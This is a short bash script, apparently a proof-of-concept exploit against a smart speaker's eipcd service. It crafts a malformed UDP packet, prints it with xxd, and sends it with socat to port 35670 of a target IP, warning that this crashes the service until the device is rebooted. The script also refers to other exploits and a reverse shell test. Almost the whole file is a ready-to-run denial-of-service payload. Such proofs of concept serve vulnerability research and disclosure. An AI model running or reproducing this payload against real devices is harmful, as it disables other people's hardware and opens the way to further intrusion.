#!/bin/bash
#
#

which socat || { echo "Socat not found - please apt install socat"; exit 1; }
which xxd || { echo "xxd not found - please apt install xxd (or vim-common) to view payloads"; exit 1; }


test -z "$1" && { echo "Second argument should be the IP address of the smart speaker; use nmap to find it"; exit 1; }
SPEAKER_IP="$1"

echo "UDP PAYLOAD:"
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00\x31\00'$(for x in $(seq 1 126) ; do echo -n -e a ; done)'ignored\00' | xxd
echo

echo "Warning, this will crash eipcd and require a reboot for further exploits to work again!"
echo
echo Press ENTER to continue
read -r dummy


echo "Sending payload - this sends a string of \"1\" which because it has no backslash should trigger segfault"
# socat it away!
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00\x31\00'$(for x in $(seq 1 126) ; do echo -n -e a ; done)'ignored\00' | socat - udp4:$SPEAKER_IP:35670


echo "To verify, run this after running the reverse shell test and use ps to grep for eipcd; or just fail to send other exploits multiple times"

echo "Done"

